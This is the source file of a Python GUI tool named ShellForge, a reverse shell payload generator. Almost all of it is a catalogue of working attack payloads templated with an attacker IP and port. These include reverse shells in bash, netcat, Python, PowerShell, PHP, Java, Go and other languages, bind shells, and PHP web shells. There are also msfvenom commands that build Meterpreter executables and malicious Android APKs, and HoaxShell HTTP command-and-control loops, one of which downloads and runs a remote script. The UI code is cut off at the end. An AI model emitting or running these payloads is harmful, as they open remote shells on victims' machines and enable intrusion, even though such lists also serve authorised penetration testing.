# =============================================================================
# SHELLFORGE - Complete Reverse Shell Generator
# All 100+ payloads from revshells.com
# =============================================================================
import os, base64, urllib.parse
from datetime import datetime
from PySide6.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QLabel, QLineEdit, QPushButton,
    QGroupBox, QListWidget, QListWidgetItem, QFileDialog, QScrollArea, QApplication, 
    QButtonGroup, QRadioButton)
from PySide6.QtCore import Qt
from modules.bases import ToolBase, ToolCategory
from core.fileops import RESULT_BASE
from ui.styles import (COLOR_BACKGROUND_INPUT, COLOR_BACKGROUND_PRIMARY, COLOR_TEXT_PRIMARY,
    COLOR_BORDER, StyledComboBox, TOOL_VIEW_STYLE, CommandDisplay, GROUPBOX_STYLE)

# Shell types from revshells.com
SHELL_TYPES = ['sh', '/bin/sh', 'bash', '/bin/bash', 'cmd', 'powershell', 'pwsh', 'ash', 'bsh', 'csh', 'ksh', 'zsh', 'pdksh', 'tcsh', 'mksh', 'dash']

# All reverse shells
REVERSE = [
    {"name":"Bash -i","cmd":"{shell} -i >& /dev/tcp/{ip}/{port} 0>&1","os":"linux"},
    {"name":"Bash 196","cmd":"0<&196;exec 196<>/dev/tcp/{ip}/{port}; {shell} <&196 >&196 2>&196","os":"linux"},
    {"name":"Bash read line","cmd":"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done","os":"linux"},
    {"name":"Bash 5","cmd":"{shell} -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5","os":"linux"},
    {"name":"Bash udp","cmd":"{shell} -i >& /dev/udp/{ip}/{port} 0>&1","os":"linux"},
    {"name":"nc mkfifo","cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f","os":"linux"},
    {"name":"nc -e","cmd":"nc {ip} {port} -e {shell}","os":"linux"},
    {"name":"nc.exe -e","cmd":"nc.exe {ip} {port} -e {shell}","os":"windows"},
    {"name":"BusyBox nc -e","cmd":"busybox nc {ip} {port} -e {shell}","os":"linux"},
    {"name":"nc -c","cmd":"nc -c {shell} {ip} {port}","os":"linux"},
    {"name":"ncat -e","cmd":"ncat {ip} {port} -e {shell}","os":"linux"},
    {"name":"ncat.exe -e","cmd":"ncat.exe {ip} {port} -e {shell}","os":"windows"},
    {"name":"ncat udp","cmd":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|ncat -u {ip} {port} >/tmp/f","os":"linux"},
    {"name":"curl","cmd":"C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | {shell} 2>&1 | $C >/dev/null","os":"linux"},
    {"name":"rustcat","cmd":"rcat connect -s {shell} {ip} {port}","os":"linux"},
    {"name":"C","cmd":"#include <stdio.h>\n#include <sys/socket.h>\n#include <sys/types.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <netinet/in.h>\n#include <arpa/inet.h>\n\nint main(void){\n    int port = {port};\n    struct sockaddr_in revsockaddr;\n    int sockt = socket(AF_INET, SOCK_STREAM, 0);\n    revsockaddr.sin_family = AF_INET;\n    revsockaddr.sin_port = htons(port);\n    revsockaddr.sin_addr.s_addr = inet_addr(\"{ip}\");\n    connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr));\n    dup2(sockt, 0); dup2(sockt, 1); dup2(sockt, 2);\n    char * const argv[] = {\"{shell}\", NULL};\n    execvp(\"{shell}\", argv);\n    return 0;\n}","os":"linux"},
    {"name":"C# TCP Client","cmd":"using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.Net;\nusing System.Net.Sockets;\n\nnamespace ConnectBack {\n    public class Program {\n        static StreamWriter streamWriter;\n        public static void Main(string[] args) {\n            using(TcpClient client = new TcpClient(\"{ip}\", {port})) {\n                using(Stream stream = client.GetStream()) {\n                    using(StreamReader rdr = new StreamReader(stream)) {\n                        streamWriter = new StreamWriter(stream);\n                        StringBuilder strInput = new StringBuilder();\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"{shell}\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n                        while(true) {\n                            strInput.Append(rdr.ReadLine());\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }\n                    }\n                }\n            }\n        }\n        private static void CmdOutputDataHandler(object sp, DataReceivedEventArgs outLine) {\n            StringBuilder strOutput = new StringBuilder();\n            if (!String.IsNullOrEmpty(outLine.Data)) {\n                try { strOutput.Append(outLine.Data); streamWriter.WriteLine(strOutput); streamWriter.Flush(); }\n                catch (Exception err) { }\n            }\n        }\n    }\n}","os":"all"},
    {"name":"Haskell #1","cmd":"module Main where\nimport System.Process\nmain = callCommand \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | {shell} -i 2>&1 | nc {ip} {port} >/tmp/f\"","os":"linux"},
    {"name":"OpenSSL","cmd":"mkfifo /tmp/s; {shell} -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s","os":"linux"},
    {"name":"Perl","cmd":"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"{shell} -i\");};'","os":"linux"},
    {"name":"Perl no sh","cmd":"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'","os":"linux"},
    {"name":"PHP exec","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"PHP shell_exec","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});shell_exec(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"PHP system","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});system(\"{shell} <&3 >&3 2>&3\");'","os":"all"},
    {"name":"PHP passthru","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});passthru(\"{shell} <&3 >&3 2>&3\");'","os":"linux"},
    {"name":"PHP popen","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"{shell} <&3 >&3 2>&3\", \"r\");'","os":"all"},
    {"name":"PHP proc_open","cmd":"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell}\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'","os":"all"},
    {"name":"PHP cmd","cmd":"<?php if(isset($_REQUEST[\"cmd\"])){ echo \"<pre>\"; $cmd = ($_REQUEST[\"cmd\"]); system($cmd); echo \"</pre>\"; die; }?>","os":"all"},
    {"name":"PHP cmd small","cmd":"<?=`$_GET[0]`?>","os":"all"},
    {"name":"Windows ConPty","cmd":"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}","os":"windows"},
    {"name":"PowerShell #1","cmd":"$LHOST = \"{ip}\"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write(\"$Output`n\"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()","os":"windows"},
    {"name":"PowerShell #2","cmd":"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"","os":"windows"},
    {"name":"PowerShell #3","cmd":"powershell -nop -W hidden -noni -ep bypass -c \"$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()\"","os":"windows"},
    {"name":"PowerShell #4 (TLS)","cmd":"$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$sslProtocols,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = New-Object System.Byte[] 4096 ;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()","os":"windows"},
    {"name":"Python #1","cmd":"export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python #2","cmd":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 #1","cmd":"export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 #2","cmd":"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Python3 Windows","cmd":"import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()","os":"windows"},
    {"name":"Python3 shortest","cmd":"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'","os":"linux"},
    {"name":"Ruby #1","cmd":"ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'","os":"linux"},
    {"name":"Ruby no sh","cmd":"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'","os":"linux"},
    {"name":"socat #1","cmd":"socat TCP:{ip}:{port} EXEC:{shell}","os":"linux"},
    {"name":"socat #2 (TTY)","cmd":"socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane","os":"linux"},
    {"name":"sqlite3 nc mkfifo","cmd":"sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'","os":"linux"},
    {"name":"node.js","cmd":"require('child_process').exec('nc -e {shell} {ip} {port}')","os":"linux"},
    {"name":"node.js #2","cmd":"(function(){var net = require(\"net\"),cp = require(\"child_process\"),sh = cp.spawn(\"{shell}\", []);var client = new net.Socket();client.connect({port}, \"{ip}\", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);});return /a/;})();","os":"all"},
    {"name":"Java #1","cmd":"public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}","os":"linux"},
    {"name":"Java #2","cmd":"public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}","os":"linux"},
    {"name":"Java #3","cmd":"import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0) so.write(pi.read());\n                while (pe.available() > 0) so.write(pe.read());\n                while (si.available() > 0) po.write(si.read());\n                so.flush(); po.flush();\n                Thread.sleep(50);\n                try { p.exitValue(); break; } catch (Exception e) {}\n            }\n            p.destroy(); s.close();\n        } catch (Exception e) {}\n    }\n}","os":"all"},
    {"name":"Groovy","cmd":"String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();","os":"windows"},
    {"name":"telnet","cmd":"TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF","os":"linux"},
    {"name":"zsh","cmd":"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'","os":"linux"},
    {"name":"Lua #1","cmd":"lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"","os":"linux"},
    {"name":"Lua #2","cmd":"lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'","os":"all"},
    {"name":"Golang","cmd":"echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go","os":"all"},
    {"name":"Vlang","cmd":"echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v","os":"linux"},
    {"name":"Awk","cmd":"awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null","os":"linux"},
    {"name":"Dart","cmd":"import 'dart:io';\nimport 'dart:convert';\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout.transform(utf8.decoder).listen((output) { socket.write(output); });\n      });\n    }, onDone: () { socket.destroy(); });\n  });\n}","os":"all"},
    {"name":"Crystal","cmd":"crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'","os":"linux"},
]

# Bind shells
BIND = [
    {"name":"Python3 Bind","cmd":"python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'","os":"all"},
    {"name":"PHP Bind","cmd":"php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'","os":"all"},
    {"name":"nc Bind","cmd":"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f","os":"linux"},
    {"name":"Perl Bind","cmd":"perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'","os":"linux"},
]

# MSFVenom payloads
MSFVENOM = [
    {"name":"Windows Meterpreter Staged (x64)","cmd":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Windows Meterpreter Stageless (x64)","cmd":"msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Windows Staged (x64)","cmd":"msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Windows Stageless (x64)","cmd":"msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe","os":"windows"},
    {"name":"Windows JSP Staged","cmd":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o rev.jsp","os":"windows"},
    {"name":"Windows ASPX Staged","cmd":"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx","os":"windows"},
    {"name":"Windows ASPX Staged (x64)","cmd":"msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx","os":"windows"},
    {"name":"Linux Meterpreter Staged (x64)","cmd":"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf","os":"linux"},
    {"name":"Linux Stageless (x64)","cmd":"msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf","os":"linux"},
    {"name":"Windows Bind ShellCode BOF","cmd":"msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode","os":"windows"},
    {"name":"macOS Meterpreter Staged (x64)","cmd":"msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho","os":"mac"},
    {"name":"macOS Meterpreter Stageless (x64)","cmd":"msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho","os":"mac"},
    {"name":"macOS Stageless (x64)","cmd":"msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho","os":"mac"},
    {"name":"PHP Meterpreter Stageless","cmd":"msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php","os":"all"},
    {"name":"PHP Reverse","cmd":"msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php","os":"all"},
    {"name":"JSP Stageless","cmd":"msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp","os":"all"},
    {"name":"WAR Stageless","cmd":"msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war","os":"all"},
    {"name":"Android Meterpreter","cmd":"msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk","os":"android"},
    {"name":"Android Embed","cmd":"msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk","os":"android"},
    {"name":"iOS Meterpreter","cmd":"msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload","os":"ios"},
    {"name":"Python Stageless","cmd":"msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw","os":"all"},
    {"name":"Bash Stageless","cmd":"msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh","os":"linux"},
]

# HoaxShell payloads
HOAXSHELL = [
    {"name":"Windows CMD cURL","cmd":"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL","os":"windows"},
    {"name":"PowerShell IEX","cmd":"$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}","os":"windows"},
    {"name":"PowerShell IEX CLM","cmd":"$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}","os":"windows"},
    {"name":"PowerShell Outfile","cmd":"$s='{ip}:{port}';$i='add29918-6263f3e6-2f810c1e';$p='http://';$f=\"C:\\Users\\$env:USERNAME\\.local\\hack.ps1\";$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/add29918 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/6263f3e6 -Headers @{\"Authorization\"=$i});if ($c -eq 'exit') {del $f;exit} elseif ($c -ne 'None') {echo \"$c\" | out-file -filepath $f;$r=powershell -ep bypass $f -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/2f810c1e -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}","os":"windows"},
    {"name":"Windows CMD cURL HTTPS","cmd":"@echo off&cmd /V:ON /C \"SET ip={ip}:{port}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=https://&&curl -fs -k !protocol!!ip!/eb6a44aa -H !sid! > NUL & for /L %i in (0) do (curl -fs -k !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl -fs -k !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL","os":"windows"},
    {"name":"PowerShell IEX HTTPS","cmd":"add-type @\"\nusing System.Net;using System.Security.Cryptography.X509Certificates;\npublic class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(\nServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}\n\"@\n[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy\n$s='{ip}:{port}';$i='1cdbb583-f96894ff-f99b8edc';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/1cdbb583 -Headers @{\"Authorization\"=$i};while ($true){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/f96894ff -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=Invoke-RestMethod -Uri $p$s/f99b8edc -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}","os":"windows"},
]

# Listeners
LISTENERS = [
    ("nc", "nc -lvnp {port}"),
    ("nc freebsd", "nc -lvn {port}"),
    ("busybox nc", "busybox nc -lp {port}"),
    ("ncat", "ncat -lvnp {port}"),
    ("ncat.exe", "ncat.exe -lvnp {port}"),
    ("ncat (TLS)", "ncat --ssl -lvnp {port}"),
    ("rlwrap + nc", "rlwrap -cAr nc -lvnp {port}"),
    ("rustcat", "rcat listen {port}"),
    ("socat", "socat -d -d TCP-LISTEN:{port} STDOUT"),
    ("socat (TTY)", "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{port}"),
    ("pwncat", "python3 -m pwncat -lp {port}"),
    ("msfconsole", "msfconsole -q -x \"use multi/handler; set payload {payload}; set lhost {ip}; set lport {port}; exploit\""),
]

# Categories
CATEGORIES = [("🔴 Reverse", REVERSE), ("⚫ Bind", BIND), ("🟢 MSFVenom", MSFVENOM), ("🟡 HoaxShell", HOAXSHELL)]

class ShellForgeTool(ToolBase):
    @property
    def name(self): return "ShellForge"
    @property
    def category(self): return ToolCategory.PAYLOAD_GENERATOR
    def get_widget(self, main_window): return ShellForgeView(main_window=main_window)

class ShellForgeView(QWidget):
    def __init__(self, main_window=None):
        super().__init__()
        self.main_window = main_window
        self.current_shells = REVERSE
        self._build_ui()
        self._connect_signals()
        self._update_shell_list()
    
    def _build_ui(self):
        self.setStyleSheet(TOOL_VIEW_STYLE)
        main = QVBoxLayout(self)
